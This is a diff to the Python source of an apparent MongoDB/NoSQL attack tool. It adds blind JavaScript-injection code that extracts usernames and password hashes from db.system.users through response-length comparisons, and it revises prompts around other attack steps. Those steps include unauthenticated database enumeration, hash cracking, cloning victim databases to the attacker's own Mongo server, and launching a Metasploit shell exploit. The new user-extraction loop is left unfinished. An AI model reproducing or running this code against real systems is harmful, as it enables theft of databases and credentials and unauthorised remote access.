@@ -26,6 +26,7 @@ import subprocess
 import json
 import gridfs
 import ipcalc
+import signal
 from hashlib import md5
 
 #Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
@@ -240,10 +241,6 @@ def options():
 					print "\nShell/DB listener set to " + myIP + "\n"
 					optionSet[4] = True
 			options()
-			#myIP = raw_input("Enter host IP for my Mongo/Shells: ")
-			#print "Shell IP set to " + myIP + "\n"
-			#optionSet[4] = True
-			#options()
 		
 		elif select == "6":
 			myPort = raw_input("Enter TCP listener for shells: ")
@@ -345,7 +342,7 @@ def netAttacks(target):
 	#This is a global for future use with other modules; may change
 	global dbList
 	
-	srvNeedCreds = raw_input("Does the database server need credentials? ")
+	srvNeedCreds = raw_input("Does the database server need credentials (y/n)? ")
 	
 	if srvNeedCreds == "n" or srvNeedCreds == "N":
 		
@@ -378,7 +375,7 @@ def netAttacks(target):
 		mgtRespCode = urllib.urlopen(mgtUrl).getcode()
 		if mgtRespCode == 200:
 			print "MongoDB web management open at " + mgtUrl + ".  No authentication required!"
-			testRest = raw_input("Start tests for REST Interface? ")
+			testRest = raw_input("Start tests for REST Interface (y/n)? ")
 
 		if testRest == "y" or testRest == "Y":
 			restUrl = mgtUrl + "/listDatabases?text=1"
@@ -443,7 +440,7 @@ def netAttacks(target):
 						print "Username: " + users[x]['user']
 						print "Hash: " + users[x]['pwd']
 						print "\n"
-						crack = raw_input("Crack this hash? ")
+						crack = raw_input("Crack this hash (y/n)? ")
 						
 						if crack == "y":
 							brute_pass(users[x]['user'],users[x]['pwd'])
@@ -454,7 +451,7 @@ def netAttacks(target):
 		print "\n"
 		#Start GridFS enumeration
 		
-		testGrid = raw_input("Check for GridFS? ")
+		testGrid = raw_input("Check for GridFS (y/n)? ")
 		
 		if testGrid == "y" or testGrid == "Y":
 			for dbItem in dbList:
@@ -469,12 +466,12 @@ def netAttacks(target):
 				except:
 					print "GridFS not enabled on " + str(dbItem) + "."
 							
-		stealDB = raw_input("Steal a database? (Requires your own Mongo instance): ")
+		stealDB = raw_input("Steal a database (y/n-Requires your own Mongo server)?: ")
 		
 		if stealDB == "y" or stealDB == "Y":
 			stealDBs (myIP)
 			
-		getShell = raw_input("Try to get a shell? (Requrires mongoDB <2.2.4)? ")
+		getShell = raw_input("Try to get a shell? (y/n-Requrires mongoDB <2.2.4)? ")
 		
 		if getShell == "y" or getShell == "Y":
 			#Launch Metasploit exploit
@@ -713,7 +710,7 @@ def webApps():
 			possAddrs.append(uriArray[9])
 			
 		print "\n"
-		doTimeAttack = raw_input("Start timing based tests? ")
+		doTimeAttack = raw_input("Start timing based tests (y/n)? ")
 		
 		if doTimeAttack == "y" or doTimeAttack == "Y":
 			print "Starting Javascript string escape time based injection..."
@@ -777,7 +774,7 @@ def webApps():
 		else:
 			print "Integer attack-Unsuccessful"
 		
-		fileOut = raw_input("Save results to file? ")
+		fileOut = raw_input("Save results to file (y/n)? ")
 		
 		if fileOut == "y" or fileOut == "Y":
 			savePath = raw_input("Enter output file name: ")
@@ -809,7 +806,7 @@ def webApps():
 def webDBAttacks(trueLen):
 	nameLen = 0
 	injTestLen = 0
-	getDBName = raw_input("Get database name? ")
+	getDBName = raw_input("Get database name (y/n)? ")
 	
 	if getDBName == "y" or getDBName == "Y":
 		while injTestLen != trueLen:
@@ -987,7 +984,7 @@ def stealDBs(myDB):
 		
 	try:
 		#Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
-		dbNeedCreds = raw_input("Does this database require credentials? ")
+		dbNeedCreds = raw_input("Does this database require credentials (y/n)? ")
 		
 		if dbNeedCreds == "n" or dbNeedCreds == "N":	
 			myDBConn = pymongo.MongoClient(myDB,27017)
@@ -1002,7 +999,7 @@ def stealDBs(myDB):
 			raw_input("Invalid Selection.  Press enter to continue.")
 			stealDBs(myDB)
 			
-		cloneAnother = raw_input("Database cloned.  Copy another? ")
+		cloneAnother = raw_input("Database cloned.  Copy another (y/n)? ")
 		
 		if cloneAnother == "y" or cloneAnother == "Y":
 			stealDBs(myDB)
@@ -1144,7 +1141,10 @@ def getDBInfo():
 	charCounter = 0
 	nameCounter = 0
 	usrCount = 0
-	usrRetr = 0
+	retrUsers = 0
+	users = []
+	hashes = []
+	
 	chars = string.ascii_letters + string.digits
 	print "Getting baseline True query return size..."
 	trueUri = uriArray[16].replace("---","return true; var dummy ='!" + "&")
@@ -1191,7 +1191,7 @@ def getDBInfo():
 			charCounter += 1
 	print "\n"
 	
-	getUserInf = raw_input("Get database users and password hashes? ")
+	getUserInf = raw_input("Get database users and password hashes (y/n)? ")
 	
 	if getUserInf == "y" or getUserInf == "Y":
 		charCounter = 0
@@ -1208,45 +1208,75 @@ def getDBInfo():
 			else:
 				usrCount += 1
 		
-		print "User:password hash"		
-		while usrRetr < usrCount:
-			while gotUserCnt == False:
-				#first solve for the first user in the DB
-				#figure out how long the username is
-				usrLenUri = uriArray[16].replace("---", "cur=db.system.users.findOne();uname=cur.user; if (uname.length==" + str(charCounter) + "){return true;}var dum = 'a" + "&")
-				lenUri = int(len(urllib.urlopen(usrLenUri).read()))
-			
-				if lenUri == baseLen:
-					print "First username is" + str(charCounter) + "characters."
-					gotUserCnt = True
-			
-				else:
-					charCounter += 1
+		usrChars = 0  #total number of characters in username
+		charCounterUsr = 0 #position in the character array-Username
+		rightCharsUsr = 0 #number of correct characters-Username
+		rightCharsHash = 0 #number of correct characters-hash
+		charCounterHash = 0
+		username = ""
+		pwdHash = ""
+		charCountUsr = False
+		query = "{}"
+		
+		while retrUsers < usrCount:
+				if retrUsers == 0:
+					while charCountUsr == False:
+						#different query to get the first user vs. others
+						usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
+						lenUri = int(len(urllib.urlopen(usrUri).read()))
 				
-		
-			while finUser == False:	
-				charUri = uriArray[16].replace("---","var cur = db.system.users.findOne(); if (cur.user.charAt(" + str(nameCounter) + ") == '"+ chars[charCounter] + "') { return true; } vardum='a" + "&")
-				#print "Debug: " + charUri
-		
-				lenUri = int(len(urllib.urlopen(charUri).read()))
-				#print "debug: " + str(charCounter)
-				#print "Debug length: " + str(lenUri)
-		
-				if lenUri == baseLen:
-					uName = uName + chars[charCounter]
-					print chars[charCounter],
-					nameCounter += 1
-					charCounter = 0
-			
-				if nameCounter == curLen:
-					finUser = True
+						if lenUri == baseLen:
+							#Got the right number of characters
+							charCountUsr = True
 				
+						else:
+							usrChars += 1
+					
+					while  rightCharsUsr < usrChars:
+						usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } vardum='a" + "&")
+						lenUri = int(len(urllib.urlopen(usrUri).read()))
+						
+						if lenUri == baseLen:
+							username = username + chars[charCounterUsr]
+							#print username
+							rightCharsUsr += 1
+							charCounterUsr = 0				
+				
+						else:
+							charCounterUsr += 1
+				
+					retrUsers += 1
+					users.append(username)
+					#print str(retrUsers)
+					#print str(users)
+					
+					while rightCharsHash < 32:  #Hash length is static
+						hashUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } vardum='a" + "&")
+						lenUri = int(len(urllib.urlopen(hashUri).read()))
+						
+						if lenUri == baseLen:
+							pwdHash = pwdHash + chars[charCounterHash]
+							#print pwdHash
+							rightCharsHash += 1
+							charCounterHash = 0
+							
+						else:
+							charCounterHash += 1
+						
+					hashes.append(pwdHash)
+					print "Got user:hash " + users[0] + ":" + hashes[0]
+					
 				else:
-					charCounter += 1
+					print "more users go here."
 		
 		
 		
 			
 	raw_input("Press enter to continue...")
 
+def signal_handler(signal, frame):
+    print "\n"
+    print "CTRL+C detected.  Exiting."
+    sys.exit(0)
+signal.signal(signal.SIGINT, signal_handler)
 mainMenu()
